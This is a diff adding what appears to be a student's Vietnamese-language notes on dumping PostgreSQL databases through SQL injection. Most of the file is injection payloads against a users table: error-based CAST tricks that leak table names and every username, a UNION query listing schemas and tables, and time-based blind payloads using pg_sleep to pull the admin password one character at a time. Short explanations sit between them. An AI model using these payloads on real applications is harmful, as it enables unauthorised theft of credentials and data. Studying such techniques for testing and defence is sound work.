@@ -1,0 +1,90 @@
+Các câu truy vấn psql để dump db
+
+1. Kiểm tra các database có trong user này
+SELECT datname FROM pg_database;
+
+2. Kiểm tra rang mình đang xài db nào
+SELECT current_database();
+
+3. Kiểm tra table_name trong database mà mình đang sử dụng
+SELECT table_name FROM information_schema.tables WHERE TABLE_catalog = current_database();
+
+4. Dựa theo table_name đó, xem các cột có trong table cụ thể VD : 'a'
+SELECT table_name, columns_name FROM information_schema.columns WHERE table_name = 'a';
+
+
+5. ERROR BASED : 
+Trước tiên thì vẫn sẽ dump table thui
+
+SELECT * FROM users WHERE username = '' and 1=CAST((select TABLE_NAME from information_schema.tables LIMIT 1 ) AS INT ) ;-- -
+
+*explain : từ SELECT * FROM users WHERE username = '' thì vẫn là true, nhưng không có giá trị cụ thể nào từ table users
+Tiếp theo cho 1 câu điều kiện `AND` so sánh giữa số 1 VÀ (ép kiểu) từ tên bangr thành số nguyên. Tên bang thì không thể là số nguyên. Nên chương trình gây ra lỗi từ đây.
+Và lỗi sẽ nói về ép kiểu không thành công. (một dòng chữ nào đó) khong thể là số nguyên.
+
+6. 
+SELECT * FROM users WHERE username = '' and 1=CAST((select TABLE_NAME from information_schema.tables WHERE TABLE_NAME NOT IN ('users') LIMIT 1 ) AS INT ) ;-- -
+
+Đây là bước tiếp theo khi ta đã tìm ra được một bang là users
+
+7.
+
+
+
+-- SELECT * FROM users WHERE username = '' UNION 
+-- SELECT 1,TABLE_SCHEMA, STRING_AGG(TABLE_NAME, ',') 
+-- 	FROM INFORMATION_SCHEMA.TABLES 
+-- 	WHERE TABLE_CATALOG = CURRENT_DATABASE() AND TABLE_SCHEMA 
+-- 	NOT IN ('information_schema', 'pg_catalog') 
+-- 	GROUP BY TABLE_SCHEMA;-- -
+
+
+8.
+Đây là câu query list hết giá trị của cả cột username khi đã biết được cột này nằm trong bảng users. Và lại một lần nữa, một chuỗi không thể là một số nguyên
+
+ SELECT * FROM users WHERE username = '' AND 1=CAST((SELECT STRING_AGG(username, ',') FROM users )AS INT);-- 
+
+
+
+
+
+9.
+
+SELECT * 
+FROM users
+WHERE username = ''
+AND (SELECT CASE 
+             WHEN SUBSTRING(password, 1, 1) < 'p' 
+             THEN pg_sleep(5) 
+             ELSE NULL 
+           END 
+     FROM users 
+     WHERE username = 'admin') IS NULL ;-- -
+
+
+
+10. 
+
+SELECT * 
+FROM users
+WHERE username = ''
+AND (
+    SELECT CASE 
+             WHEN EXISTS (
+                 SELECT 1 FROM (
+                     SELECT datname FROM pg_database WHERE datname NOT IN ('postgres') LIMIT 1
+                 ) AS sub_query WHERE SUBSTRING(datname, 1, 1) = 'E'
+             ) THEN pg_sleep(3) 
+             ELSE NULL 
+           END 
+) IS NULL;
+
+
+11.
+SELECT 1 FROM 
+	(SELECT TABLE_NAME, COLUMN_NAME, TABLE_CATALOG 
+	FROM INFORMATION_SCHEMA.COLUMNS 
+	WHERE TABLE_SCHEMA 
+	NOT IN ('information_schema', 'pg_catalog') 
+	 AND COLUMN_NAME NOT IN ('') LIMIT 1 )
+	WHERE SUBSTRING(COLUMN_NAME, 1, 1) = 'i' AND TABLE_NAME = 'users' AND TABLE_CATALOG = 'phuc'
